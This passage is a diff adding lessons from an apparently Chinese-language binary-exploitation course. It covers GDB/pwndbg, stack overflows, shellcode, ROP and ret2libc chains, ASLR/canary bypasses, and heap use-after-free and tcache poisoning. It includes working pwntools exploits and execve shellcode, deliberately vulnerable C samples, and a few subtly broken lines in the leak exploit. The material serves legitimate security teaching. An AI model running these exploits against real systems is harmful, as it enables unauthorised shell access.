+<span class="ins">pop</span>  <span class="reg">rax</span>           <span class="cm">; rax = [rsp]; rsp += 8（彈棧）</span>
+<span class="ins">xchg</span> <span class="reg">rax</span>, <span class="reg">rbx</span>     <span class="cm">; 交換兩個暫存器的值</span>
+
+<span class="cm">; ─── 算術與邏輯 ───</span>
+<span class="ins">add</span>  <span class="reg">rax</span>, <span class="reg">rbx</span>     <span class="cm">; rax += rbx</span>
+<span class="ins">sub</span>  <span class="reg">rax</span>, <span class="nu">0x10</span>   <span class="cm">; rax -= 0x10（常見：分配 Stack 空間 sub rsp, 0x30）</span>
+<span class="ins">imul</span> <span class="reg">rax</span>, <span class="reg">rbx</span>    <span class="cm">; rax *= rbx（有符號乘法）</span>
+<span class="ins">xor</span>  <span class="reg">rax</span>, <span class="reg">rax</span>    <span class="cm">; rax = 0（快速清零技巧）</span>
+<span class="ins">and</span>  <span class="reg">rax</span>, <span class="reg">rbx</span>    <span class="cm">; rax &= rbx</span>
+<span class="ins">or</span>   <span class="reg">rax</span>, <span class="reg">rbx</span>    <span class="cm">; rax |= rbx</span>
+<span class="ins">not</span>  <span class="reg">rax</span>          <span class="cm">; rax = ~rax（位元反轉）</span>
+<span class="ins">neg</span>  <span class="reg">rax</span>          <span class="cm">; rax = -rax（二補數取反）</span>
+<span class="ins">shl</span>  <span class="reg">rax</span>, <span class="nu">3</span>       <span class="cm">; rax <<= 3（左移，等效乘以 8）</span>
+<span class="ins">shr</span>  <span class="reg">rax</span>, <span class="nu">1</span>       <span class="cm">; rax >>= 1（邏輯右移）</span>
+
+<span class="cm">; ─── 比較與跳轉 ───</span>
+<span class="ins">cmp</span>  <span class="reg">rax</span>, <span class="reg">rbx</span>    <span class="cm">; 比較（設置 FLAGS，不改變暫存器值）</span>
+<span class="ins">test</span> <span class="reg">rax</span>, <span class="reg">rax</span>    <span class="cm">; 測試是否為零（test rax,rax; jz → 若 rax==0 則跳轉）</span>
+<span class="ins">jmp</span>  <span class="addr">0x400500</span>    <span class="cm">; 無條件跳轉</span>
+<span class="ins">je</span> / <span class="ins">jz</span>  <span class="addr">label</span>   <span class="cm">; 相等/零時跳轉（Zero Flag = 1）</span>
+<span class="ins">jne</span>/<span class="ins">jnz</span> <span class="addr">label</span>   <span class="cm">; 不等/非零時跳轉</span>
+<span class="ins">jl</span> / <span class="ins">jg</span>  <span class="addr">label</span>   <span class="cm">; 有符號小於/大於跳轉</span>
+<span class="ins">jb</span> / <span class="ins">ja</span>  <span class="addr">label</span>   <span class="cm">; 無符號低於/高於跳轉</span>
+
+<span class="cm">; ─── 函式呼叫與返回 ───</span>
+<span class="ins">call</span> <span class="fn">func</span>          <span class="cm">; push rip+5（下條指令）; jmp func</span>
+<span class="ins">ret</span>                <span class="cm">; pop rip（從 Stack 讀取返回地址並跳轉）← 溢位攻擊目標！</span>
+<span class="ins">leave</span>              <span class="cm">; mov rsp, rbp; pop rbp（等效的函式結尾收尾）</span>
+
+<span class="cm">; ─── 系統呼叫（Linux x86-64）───</span>
+<span class="ins">syscall</span>            <span class="cm">; 執行系統呼叫（RAX = 系統呼叫號）</span>
+<span class="cm">; 常用呼叫號：</span>
+<span class="cm">; 0 = read(fd, buf, count)    → rax=0, rdi=fd, rsi=buf, rdx=count</span>
+<span class="cm">; 1 = write(fd, buf, count)   → rax=1, rdi=fd, rsi=buf, rdx=count</span>
+<span class="cm">; 59 = execve(path, argv, envp) → rax=59, rdi="/bin/sh", rsi=0, rdx=0</span></pre>
+</div>
+</div>
+
+<!-- L1-4 GDB / pwndbg -->
+<div class="cb" id="l1-4">
+<h2>GDB / pwndbg 調試環境搭建</h2>
+<p>GDB（GNU Debugger）配合 pwndbg 插件是 Exploit 開發的核心工具。pwndbg 提供了豐富的可視化和 Exploit 開發專用命令，大幅提升調試效率。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">GDB + pwndbg 安裝與常用命令</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── 安裝 pwndbg ───</span>
+git clone https://github.com/pwndbg/pwndbg
+cd pwndbg && ./setup.sh
+<span class="cm"># 安裝後 GDB 自動載入 pwndbg 插件</span>
+
+<span class="cm"># ─── 啟動 GDB ───</span>
+gdb ./vulnerable_program          <span class="cm"># 直接附加執行檔</span>
+gdb -p 1234                       <span class="cm"># 附加到已執行中的進程</span>
+gdb -q ./prog                     <span class="cm"># -q 安靜模式（不顯示版本訊息）</span>
+
+<span class="cm"># ─── 執行控制 ───</span>
+(pwndbg) run                      <span class="cm"># 啟動程式（r）</span>
+(pwndbg) run &lt; input.txt          <span class="cm"># 從文件重導向輸入</span>
+(pwndbg) continue                 <span class="cm"># 繼續執行直到下個斷點（c）</span>
+(pwndbg) next                     <span class="cm"># 單步執行（不進入函式）（n）</span>
+(pwndbg) step                     <span class="cm"># 單步執行（進入函式）（s）</span>
+(pwndbg) nexti                    <span class="cm"># 指令級單步（ni）</span>
+(pwndbg) stepi                    <span class="cm"># 指令級單步進入（si）</span>
+(pwndbg) finish                   <span class="cm"># 執行到當前函式返回（fin）</span>
+
+<span class="cm"># ─── 斷點管理 ───</span>
+(pwndbg) break main               <span class="cm"># 在 main 函式設斷點（b）</span>
+(pwndbg) break *0x400500          <span class="cm"># 在絕對地址設斷點</span>
+(pwndbg) break *main+42           <span class="cm"># 在 main+42 偏移設斷點</span>
+(pwndbg) info breakpoints         <span class="cm"># 列出所有斷點（i b）</span>
+(pwndbg) delete 1                 <span class="cm"># 刪除斷點 #1（d 1）</span>
+(pwndbg) watch *0x601050          <span class="cm"># 監視點：該地址被寫入時中斷</span>
+
+<span class="cm"># ─── 查看狀態 ───</span>
+(pwndbg) context                  <span class="cm"># pwndbg 核心：顯示暫存器+Stack+代碼的完整視圖</span>
+(pwndbg) info registers           <span class="cm"># 查看所有暫存器（i r）</span>
+(pwndbg) print $rax               <span class="cm"># 印出暫存器值（p）</span>
+(pwndbg) x/20gx $rsp              <span class="cm"># 以 64-bit hex 格式查看 RSP 起的 20 個值</span>
+(pwndbg) x/s 0x400600             <span class="cm"># 以字串格式查看地址內容</span>
+(pwndbg) stack 20                 <span class="cm"># pwndbg：查看 Stack 上 20 個值</span>
+
+<span class="cm"># ─── pwndbg 專用命令 ───</span>
+(pwndbg) checksec                 <span class="cm"># 查看程式的安全保護（PIE/NX/Canary/RELRO）</span>
+(pwndbg) vmmap                    <span class="cm"># 查看記憶體佈局</span>
+(pwndbg) cyclic 100               <span class="cm"># 生成 100 字節的 De Bruijn 循環序列（找偏移用）</span>
+(pwndbg) cyclic -l 0x61616174     <span class="cm"># 找到此值在循環序列中的偏移</span>
+(pwndbg) rop                      <span class="cm"># 搜索 ROP gadget</span></pre>
+</div>
+
+<div class="quiz">
+  <div class="q-lbl">小測驗</div>
+  <div class="q-q">在 x86-64 Linux 中，呼叫函式 <code>write(1, buf, 100)</code>（將 100 bytes 輸出到 stdout）時，三個參數分別放在哪些暫存器中？</div>
+  <div class="q-opts">
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">A</span>RAX=1, RBX=buf, RCX=100</div>
+    <div class="qo" onclick="chkQ(this,true)"><span class="qo-k">B</span>RDI=1（fd）, RSI=buf（指標）, RDX=100（長度）</div>
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">C</span>RCX=1, RDX=buf, R8=100</div>
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">D</span>三個參數全部在 Stack 上傳遞，因為這是系統呼叫</div>
+  </div>
+  <div class="q-exp">正確！在 System V AMD64 ABI（Linux x86-64 的呼叫約定）中，前六個參數依序放入：RDI（第 1）, RSI（第 2）, RDX（第 3）, RCX（第 4）, R8（第 5）, R9（第 6）。所以 write(1, buf, 100) 的三個參數：fd=1 放 RDI，buf 指標放 RSI，長度 100 放 RDX。函式呼叫和系統呼叫的參數傳遞方式不同（syscall 的第 4 個用 R10 而非 RCX），但前三個參數位置相同。這個約定在構造 ROP 鏈和 Shellcode 時至關重要。</div>
+</div>
+</div>
+
+
+<!-- ===== CH2: Stack 溢位攻擊 ===== -->
+
+<!-- L2-1 Stack Buffer Overflow 原理 -->
+<div class="cb" id="l2-1">
+<h2>Stack Buffer Overflow 原理</h2>
+<p>Stack Buffer Overflow（堆疊緩衝區溢位）是最經典的記憶體安全漏洞。當程式向 Stack 上的緩衝區寫入超過其分配大小的資料時，多餘的資料會覆蓋相鄰的記憶體區域，包括最關鍵的返回地址（Return Address）。</p>
+
+<h3>漏洞成因：不安全的 C 函式</h3>
+<div class="cblock">
+  <div class="ctop"><span class="clang">C — 典型 Stack Overflow 漏洞代碼</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">// ─── 漏洞代碼範例 ───</span>
+<span class="kw">#include</span> <span class="st">&lt;stdio.h&gt;</span>
+<span class="kw">#include</span> <span class="st">&lt;string.h&gt;</span>
+
+<span class="kw">void</span> <span class="fn">vulnerable_function</span>() {
+    <span class="kw">char</span> buf[<span class="nu">64</span>];           <span class="cm">// ← 在 Stack 上分配 64 bytes</span>
+    <span class="fn">gets</span>(buf);              <span class="cm">// ← 危險！gets() 不限制輸入長度</span>
+    <span class="fn">printf</span>(<span class="st">"You entered: %s\n"</span>, buf);
+}
+
+<span class="kw">int</span> <span class="fn">main</span>() {
+    <span class="fn">vulnerable_function</span>();
+    <span class="kw">return</span> <span class="nu">0</span>;
+}
+
+<span class="cm">// ─── 其他常見不安全函式 ───</span>
+<span class="fn">gets</span>(buf)                  <span class="cm">// 無長度限制，已在 C11 廢棄</span>
+<span class="fn">strcpy</span>(dst, src)           <span class="cm">// 不檢查 dst 大小</span>
+<span class="fn">strcat</span>(dst, src)           <span class="cm">// 不檢查 dst 剩餘空間</span>
+<span class="fn">sprintf</span>(buf, fmt, ...)     <span class="cm">// 格式化輸出不限制長度</span>
+<span class="fn">scanf</span>(<span class="st">"%s"</span>, buf)           <span class="cm">// %s 讀到空白為止，不限長度</span>
+<span class="fn">read</span>(fd, buf, count)       <span class="cm">// count 大於 buf 則溢位</span>
+
+<span class="cm">// ─── 對應安全版本 ───</span>
+<span class="fn">fgets</span>(buf, <span class="kw">sizeof</span>(buf), stdin)  <span class="cm">// 限制讀入長度</span>
+<span class="fn">strncpy</span>(dst, src, n)             <span class="cm">// 限制複製長度</span>
+<span class="fn">snprintf</span>(buf, n, fmt, ...)       <span class="cm">// 限制格式化輸出長度</span>
+<span class="fn">scanf</span>(<span class="st">"%63s"</span>, buf)              <span class="cm">// 指定最大讀入長度</span></pre>
+</div>
+
+<h3>用 pwndbg 觀察溢位過程</h3>
+<div class="cblock">
+  <div class="ctop"><span class="clang">GDB — 確認溢位偏移量</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── 編譯（暫時關閉保護用於學習）───</span>
+gcc -o vuln vuln.c -fno-stack-protector -no-pie -z execstack
+
+<span class="cm"># ─── 用 pwndbg 找到覆蓋返回地址的偏移量 ───</span>
+gdb -q ./vuln
+(pwndbg) cyclic 100               <span class="cm"># 生成 100 bytes 的 De Bruijn 序列</span>
+<span class="cm"># aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa</span>
+(pwndbg) run
+<span class="cm"># 輸入上面的序列</span>
+<span class="cm"># 程式崩潰，顯示類似：</span>
+<span class="cm"># RIP  0x6161616f6161616e ('naaa')  ← RIP 被覆蓋為序列中的某個值</span>
+
+(pwndbg) cyclic -l 0x6161616f6161616e   <span class="cm"># 或用崩潰時 RSP 的值</span>
+<span class="cm"># 輸出：72（返回地址距離 buf 起始 72 bytes）</span>
+<span class="cm"># 表示：需要 72 bytes 的填充 + 8 bytes 的目標返回地址</span>
+
+<span class="cm"># ─── 驗算：64（buf）+ 8（saved RBP）= 72 bytes padding ─── 正確！</span></pre>
+</div>
+</div>
+
+<!-- L2-2 返回地址覆蓋與 Shellcode -->
+<div class="cb" id="l2-2">
+<h2>返回地址覆蓋與 Shellcode</h2>
+<p>確認偏移後，就可以構造實際的 Exploit：用目標地址覆蓋返回地址，讓程式跳轉到我們的代碼。在沒有 NX（No-eXecute）保護的情況下，可以直接注入 Shellcode。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">Python（pwntools）— 基礎 Stack Overflow Exploit</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="kw">from</span> pwn <span class="kw">import</span> *
+
+<span class="cm"># ─── 環境設定 ───</span>
+context.arch = <span class="st">'amd64'</span>        <span class="cm"># 設定架構（影響 Shellcode 生成）</span>
+context.os   = <span class="st">'linux'</span>
+context.log_level = <span class="st">'debug'</span>   <span class="cm"># 顯示詳細發送/接收資訊</span>
+
+p = process(<span class="st">'./vuln'</span>)         <span class="cm"># 本地進程</span>
+<span class="cm"># p = remote('target.com', 9999)  # 遠端</span>
+
+<span class="cm"># ─── Shellcode：execve("/bin/sh", NULL, NULL) ───</span>
+<span class="cm"># 方法1：pwntools 自動生成</span>
+shellcode = asm(shellcraft.sh())
+
+<span class="cm"># 方法2：手寫 x86-64 Shellcode（50 bytes）</span>
+shellcode = bytes([
+    <span class="nu">0x48</span>,<span class="nu">0x31</span>,<span class="nu">0xff</span>,                         <span class="cm"># xor rdi, rdi</span>
+    <span class="nu">0x48</span>,<span class="nu">0x31</span>,<span class="nu">0xf6</span>,                         <span class="cm"># xor rsi, rsi</span>
+    <span class="nu">0x48</span>,<span class="nu">0x31</span>,<span class="nu">0xd2</span>,                         <span class="cm"># xor rdx, rdx</span>
+    <span class="nu">0x48</span>,<span class="nu">0xbb</span>,<span class="nu">0x2f</span>,<span class="nu">0x62</span>,<span class="nu">0x69</span>,<span class="nu">0x6e</span>,<span class="nu">0x2f</span>,<span class="nu">0x73</span>,<span class="nu">0x68</span>,<span class="nu">0x00</span>,  <span class="cm"># mov rbx, "/bin/sh\0"</span>
+    <span class="nu">0x53</span>,                                   <span class="cm"># push rbx</span>
+    <span class="nu">0x48</span>,<span class="nu">0x89</span>,<span class="nu">0xe7</span>,                         <span class="cm"># mov rdi, rsp</span>
+    <span class="nu">0x48</span>,<span class="nu">0xc7</span>,<span class="nu">0xc0</span>,<span class="nu">0x3b</span>,<span class="nu">0x00</span>,<span class="nu">0x00</span>,<span class="nu">0x00</span>,     <span class="cm"># mov rax, 59（execve）</span>
+    <span class="nu">0x0f</span>,<span class="nu">0x05</span>                               <span class="cm"># syscall</span>
+])
+
+<span class="cm"># ─── 構造 Payload ───</span>
+offset = <span class="nu">72</span>                    <span class="cm"># 填充到返回地址的字節數</span>
+buf_addr = <span class="nu">0x7fffffffde20</span>     <span class="cm"># buf 的起始地址（GDB vmmap 中查詢）</span>
+
+payload  = shellcode           <span class="cm"># Shellcode 放在 buf 起始（跳到這裡執行）</span>
+payload += b<span class="st">'A'</span> * (offset - <span class="fn">len</span>(shellcode))  <span class="cm"># 填充剩餘空間</span>
+payload += p64(buf_addr)       <span class="cm"># 用 buf 地址覆蓋返回地址（小端序自動處理）</span>
+
+<span class="cm"># ─── 發送並獲得 Shell ───</span>
+p.sendline(payload)
+p.interactive()                <span class="cm"># 進入互動模式</span></pre>
+</div>
+</div>
+
+<!-- L2-3 ROP -->
+<div class="cb" id="l2-3">
+<h2>ROP（Return-Oriented Programming）</h2>
+<p>當 NX 開啟（Stack 不可執行）時，Shellcode 直接注入失效。ROP 是現代 Exploit 的核心技術：利用程式中已存在的代碼片段（Gadget，以 <code>ret</code> 結尾的指令序列），串聯構造任意計算，最終達到執行命令的目的。</p>
+
+<div class="note mem">
+  <div class="note-lbl">ROP 核心概念</div>
+  <p><strong>Gadget</strong>：程式或共享庫中現有的以 <code>ret</code> 結尾的短指令序列，例如 <code>pop rdi; ret</code>、<code>pop rsi; pop rdx; ret</code>。攻擊者在 Stack 上精心排列 gadget 地址和參數，每個 gadget 執行完後 <code>ret</code> 跳到下一個 gadget，形成「ROP 鏈」。由於使用程式本身的代碼，不受 NX 限制。</p>
+</div>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">ROP 鏈構造：ret2libc 攻擊（呼叫 system("/bin/sh")）</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="kw">from</span> pwn <span class="kw">import</span> *
+
+context.arch = <span class="st">'amd64'</span>
+p = process(<span class="st">'./vuln'</span>)
+elf = ELF(<span class="st">'./vuln'</span>)
+libc = ELF(<span class="st">'/lib/x86_64-linux-gnu/libc.so.6'</span>)
+
+<span class="cm"># ─── 方法1：手動構造 ROP 鏈 ───</span>
+<span class="cm"># 目標：呼叫 system("/bin/sh")</span>
+<span class="cm"># x86-64 呼叫約定：system 的第一個參數（"/bin/sh" 地址）放在 RDI</span>
+<span class="cm"># 需要 Gadget：pop rdi; ret</span>
+
+<span class="cm"># 使用 ROPgadget 或 ropper 搜索 gadget（在終端機執行）</span>
+<span class="cm"># ROPgadget --binary ./vuln --rop | grep "pop rdi"</span>
+<span class="cm"># 找到：0x0000000000400693 : pop rdi ; ret</span>
+
+pop_rdi    = <span class="nu">0x400693</span>               <span class="cm"># pop rdi; ret gadget 地址</span>
+bin_sh     = next(libc.search(b<span class="st">'/bin/sh\x00'</span>))  <span class="cm"># libc 中 "/bin/sh" 字串地址</span>
+system     = libc.sym[<span class="st">'system'</span>]    <span class="cm"># system() 函式地址</span>
+ret_gadget = <span class="nu">0x400516</span>               <span class="cm"># 單個 ret 指令（Stack 對齊用）</span>
+
+offset = <span class="nu">72</span>
+
+<span class="cm"># ROP 鏈佈局（從 Stack 頂開始）：</span>
+<span class="cm"># [pop rdi; ret] → ["/bin/sh" addr] → [ret（對齊）] → [system addr]</span>
+rop_chain  = p64(pop_rdi)            <span class="cm"># 執行：pop rdi（從 stack 取下一個值放入 rdi）</span>
+rop_chain += p64(bin_sh)             <span class="cm"># rdi = &"/bin/sh"</span>
+rop_chain += p64(ret_gadget)         <span class="cm"># 對齊 stack（某些 glibc 版本 system 需要 16-byte 對齊）</span>
+rop_chain += p64(system)             <span class="cm"># 呼叫 system("/bin/sh")</span>
+
+payload = b<span class="st">'A'</span> * offset + rop_chain
+
+<span class="cm"># ─── 方法2：pwntools 自動 ROP 鏈（更高效）───</span>
+rop = ROP(elf)
+rop.call(<span class="st">'system'</span>, [next(libc.search(b<span class="st">'/bin/sh\x00'</span>))])
+payload = b<span class="st">'A'</span> * offset + rop.chain()
+
+p.sendline(payload)
+p.interactive()</pre>
+</div>
+</div>
+
+<!-- L2-4 繞過保護 -->
+<div class="cb" id="l2-4">
+<h2>繞過 ASLR / NX / Stack Canary</h2>
+<p>現代系統預設開啟多種記憶體保護機制。Exploit 開發的大部分工作就是找到繞過這些機制的方法。</p>
+
+<div class="tbl">
+  <table class="t">
+    <thead><tr><th>保護機制</th><th>防禦原理</th><th>繞過策略</th></tr></thead>
+    <tbody>
+      <tr><td><strong>NX / DEP</strong><br><small>（No-eXecute）</small></td><td>將 Stack/Heap 標記為不可執行，注入的 Shellcode 無法運行</td><td>ROP 鏈（使用程式本身的 .text 段代碼，始終可執行）；ret2libc（跳到 libc 函式）</td></tr>
+      <tr><td><strong>ASLR</strong><br><small>（地址隨機化）</small></td><td>每次執行隨機化 Stack/Heap/mmap 的基地址，攻擊者無法預測地址</td><td>資訊洩露（Info Leak）：找到能夠洩露 libc 或 Stack 地址的漏洞，計算偏移推算其他地址；Brute Force（32-bit ASLR 只有 2^16=65536 種可能，可爆破）；Heap Spray</td></tr>
+      <tr><td><strong>Stack Canary</strong><br><small>（金絲雀值）</small></td><td>在返回地址前放置隨機 Canary 值；ret 前驗證 Canary，若被修改則 abort</td><td>資訊洩露洩露 Canary 值，在 Payload 中保留原 Canary；格式化字串漏洞讀取 Canary；覆蓋不同 Stack Frame（利用不同 Canary 邊界）</td></tr>
+      <tr><td><strong>PIE</strong><br><small>（位置無關執行檔）</small></td><td>程式本身的基地址也隨機化（配合 ASLR），.text 地址每次不同</td><td>資訊洩露洩露程式基地址；部分寫入（Partial Write）：只覆蓋地址低位字節，不破壞高位隨機值</td></tr>
+      <tr><td><strong>RELRO</strong><br><small>（重定位唯讀）</small></td><td>Full RELRO 讓 GOT（Global Offset Table）唯讀，防止 GOT 改寫攻擊</td><td>Full RELRO 下 GOT 不可寫；Partial RELRO 下 GOT 仍可寫；改目標為其他可寫的函式指標或 __free_hook/__malloc_hook</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">ret2plt / GOT 洩露繞過 ASLR（常見技巧）</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="kw">from</span> pwn <span class="kw">import</span> *
+
+<span class="cm"># ─── 兩階段 Exploit：先洩露 libc 地址，再 get shell ───</span>
+<span class="cm"># 前提：程式開啟 ASLR，但 Partial RELRO（GOT 可讀）</span>
+
+p = process(<span class="st">'./vuln'</span>)
+elf = ELF(<span class="st">'./vuln'</span>)
+libc = ELF(<span class="st">'/lib/x86_64-linux-gnu/libc.so.6'</span>)
+
+<span class="cm"># ─── 階段 1：洩露 puts 在 libc 中的實際地址 ───</span>
+<span class="cm"># ROP 鏈：呼叫 puts(puts_got) → 印出 puts 的真實地址 → 回到 main 重新開始</span>
+pop_rdi  = p64(elf.symbols[<span class="st">'__libc_csu_init'</span>] + <span class="nu">0x3</span>)  <span class="cm"># 找 pop rdi; ret</span>
+puts_plt = p64(elf.plt[<span class="st">'puts'</span>])           <span class="cm"># puts@PLT 地址（固定）</span>
+puts_got = p64(elf.got[<span class="st">'puts'</span>])           <span class="cm"># puts@GOT 地址（固定）</span>
+main     = p64(elf.sym[<span class="st">'main'</span>])           <span class="cm"># 回到 main 繼續控制</span>
+
+leak_payload = b<span class="st">'A'</span> * <span class="nu">72</span>
+leak_payload += pop_rdi + puts_got        <span class="cm"># rdi = &puts@GOT</span>
+leak_payload += puts_plt                  <span class="cm"># 呼叫 puts → 印出 puts 真實地址</span>
+leak_payload += main                      <span class="cm"># 回到 main</span>
+
+p.sendline(leak_payload)
+p.recvuntil(b<span class="st">'\n'</span>)
+leaked = u64(p.recv(<span class="nu">6</span>).ljust(<span class="nu">8</span>, b<span class="st">'\x00'</span>))  <span class="cm"># 讀取洩露的 puts 地址（6 bytes）</span>
+log.info(<span class="kw">f</span><span class="st">"puts @ {hex(leaked)}"</span>)
+
+<span class="cm"># ─── 計算 libc 基地址 ───</span>
+libc.address = leaked - libc.sym[<span class="st">'puts'</span>]  <span class="cm"># 真實地址 - 偏移 = libc 基地址</span>
+log.info(<span class="kw">f</span><span class="st">"libc base @ {hex(libc.address)}"</span>)
+
+<span class="cm"># ─── 階段 2：用已知 libc 基地址構造 shell ───</span>
+shell_payload = b<span class="st">'A'</span> * <span class="nu">72</span>
+shell_payload += p64(pop_rdi[<span class="nu">2</span>:])         <span class="cm"># 實際 pop rdi gadget 地址</span>
+shell_payload += p64(next(libc.search(b<span class="st">'/bin/sh\x00'</span>)))
+shell_payload += p64(libc.sym[<span class="st">'ret'</span>])    <span class="cm"># 對齊</span>
+shell_payload += p64(libc.sym[<span class="st">'system'</span>])
+
+p.sendline(shell_payload)
+p.interactive()</pre>
+</div>
+</div>
+
+
+<!-- ===== CH3: Heap 漏洞 ===== -->
+
+<!-- L3-1 ptmalloc2 -->
+<div class="cb" id="l3-1">
+<h2>Heap 記憶體管理：ptmalloc2 機制</h2>
+<p>Linux 使用 ptmalloc2（glibc malloc 的實作）管理 Heap 記憶體。理解其內部資料結構是分析 Heap 漏洞的前提。</p>
+
+<h3>Chunk 結構</h3>
+<div class="cblock">
+  <div class="ctop"><span class="clang">Heap Chunk 內部結構（已分配 vs 空閒）</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">/* ─── 已分配的 Chunk ─── */</span>
+<span class="cm">/*  chunk 起始（malloc 返回指標 = 這裡 + 0x10）         */</span>
+<span class="addr">0x602000</span>  │ prev_size │  <span class="cm">若前一個 chunk 空閒，存其大小；否則被前 chunk 的數據使用</span>
+<span class="addr">0x602008</span>  │   size    │  <span class="cm">本 chunk 大小（含 flags）；低三位是標誌位（P/M/A）</span>
+          │           │  <span class="cm">P（prev_inuse）= 1 表示前一個 chunk 已被分配</span>
+<span class="addr">0x602010</span>  │  user     │  <span class="cm">← malloc() 返回的指標指向這裡</span>
+          │  data     │
+          │  ...      │
+<span class="addr">0x602050</span>  │ (next     │  <span class="cm">下一個 chunk 的 prev_size 欄位</span>
+          │  chunk)   │
+
+<span class="cm">/* ─── 空閒的 Chunk（在 bin 中）─── */</span>
+<span class="addr">0x602000</span>  │ prev_size │
+<span class="addr">0x602008</span>  │   size    │  <span class="cm">P bit = 0（表示本 chunk 空閒）</span>
+<span class="addr">0x602010</span>  │    fd     │  <span class="cm">forward pointer → 下一個空閒 chunk（單鏈或雙鏈表）</span>
+<span class="addr">0x602018</span>  │    bk     │  <span class="cm">backward pointer → 上一個空閒 chunk（雙鏈表用）</span>
+          │  (can be  │  <span class="cm">fd_nextsize / bk_nextsize（large bin 用）</span>
+          │  reused） │
+
+<span class="cm"># ─── 不同 Bin 的分類（空閒 chunk 存放位置）───</span>
+<span class="cm"># tcache bin   size &lt; 0x408，每個 bin 最多 7 個 chunk（glibc 2.26+）</span>
+<span class="cm"># fast bin     size &lt;= 0x80，單鏈表 LIFO（後進先出）</span>
+<span class="cm"># unsorted bin 剛釋放的中型 chunk 先放這裡等待整理</span>
+<span class="cm"># small bin    size &lt; 0x400，雙鏈表 FIFO</span>
+<span class="cm"># large bin    size >= 0x400，按大小排序的雙鏈表</span></pre>
+</div>
+</div>
+
+<!-- L3-2 UAF -->
+<div class="cb" id="l3-2">
+<h2>Use-After-Free（UAF）漏洞</h2>
+<p>Use-After-Free 是最常見的 Heap 漏洞之一：程式在 <code>free()</code> 釋放一個 chunk 後，仍然持有指向它的指標（懸空指標），並繼續使用它。攻擊者可以重新分配這塊記憶體，用自己控制的資料替換原有物件的內容。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">C — UAF 漏洞與利用概念</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">/* ─── 漏洞代碼 ─── */</span>
+<span class="kw">typedef struct</span> {
+    <span class="kw">void</span> (*<span class="fn">print</span>)(<span class="kw">char</span> *);  <span class="cm">// 函式指標（攻擊目標！）</span>
+    <span class="kw">char</span> name[<span class="nu">24</span>];
+} User;
+
+<span class="kw">void</span> <span class="fn">normal_print</span>(<span class="kw">char</span> *s) { <span class="fn">printf</span>(<span class="st">"Hello: %s\n"</span>, s); }
+<span class="kw">void</span> <span class="fn">win</span>()  { <span class="fn">system</span>(<span class="st">"/bin/sh"</span>); }   <span class="cm">// 攻擊者想呼叫的函式</span>
+
+User *user = <span class="fn">malloc</span>(<span class="kw">sizeof</span>(User));    <span class="cm">// 分配 User（32 bytes）</span>
+user->print = normal_print;
+<span class="fn">free</span>(user);                            <span class="cm">// 釋放！chunk 回到 tcache</span>
+
+<span class="cm">// 此時 user 指標仍有效（懸空指標），但記憶體已在 tcache 中</span>
+
+<span class="cm">// 攻擊者分配相同大小的 chunk</span>
+<span class="kw">char</span> *evil = <span class="fn">malloc</span>(<span class="nu">32</span>);              <span class="cm">// 從 tcache 拿到剛才的 chunk！</span>
+<span class="cm">// evil 現在和 user 指向同一塊記憶體</span>
+
+<span class="cm">// 寫入 win() 函式地址到 evil 的前 8 bytes（覆蓋函式指標）</span>
+*(<span class="kw">void</span>**) evil = win;                   <span class="cm">// evil[0] = &win</span>
+
+<span class="cm">// 現在呼叫 user->print()，實際呼叫的是 win()！</span>
+user->print(user->name);               <span class="cm">// → 執行 system("/bin/sh")</span>
+
+<span class="cm">/* ─── UAF 防禦：釋放後清空指標 ─── */</span>
+<span class="fn">free</span>(user);
+user = <span class="kw">NULL</span>;   <span class="cm">// 設為 NULL，後續存取會 segfault 而非 UAF</span></pre>
+</div>
+</div>
+
+<!-- L3-3 Heap Overflow / tcache -->
+<div class="cb" id="l3-3">
+<h2>Heap Overflow 與 tcache 攻擊</h2>
+<p>tcache（Thread Local Cache）是 glibc 2.26 引入的每執行緒緩存機制，初期沒有完善的安全檢查，成為 CTF PWN 題的主要考點。tcache poisoning 是最常見的 Heap 攻擊技術之一。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">tcache Poisoning 攻擊原理</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── tcache 結構（glibc 2.26–2.31）───</span>
+<span class="cm"># tcache 是一個單鏈表，每個 size 的 bin 最多 7 個 chunk</span>
+<span class="cm"># 空閒 chunk 的 fd 指標指向下一個空閒 chunk（明文地址，無保護！）</span>
+<span class="cm">#                                                                    </span>
+<span class="cm"># tcache[0x20] → chunk_A → chunk_B → NULL                         </span>
+<span class="cm"># malloc(0x20) 返回 chunk_A，tcache[0x20] → chunk_B                 </span>
+
+<span class="cm"># ─── 攻擊步驟（tcache poisoning）───</span>
+<span class="cm"># 前提：存在 Heap Overflow 可以覆蓋空閒 chunk 的 fd 指標</span>
+
+<span class="cm"># STEP 1：分配兩個 chunk</span>
+<span class="cm">#   chunk_A = malloc(0x20)  → 0x602260</span>
+<span class="cm">#   chunk_B = malloc(0x20)  → 0x602290（不重要）</span>
+
+<span class="cm"># STEP 2：釋放 chunk_A，進入 tcache[0x20]</span>
+<span class="cm">#   free(chunk_A)</span>
+<span class="cm">#   tcache[0x20] → chunk_A (fd = NULL)</span>
+
+<span class="cm"># STEP 3：通過 overflow/UAF 修改 chunk_A 的 fd 為目標地址</span>
+<span class="cm">#   假設目標：__free_hook 地址 0x7f...a8b8（寫入此處可劫持任意 free() 呼叫）</span>
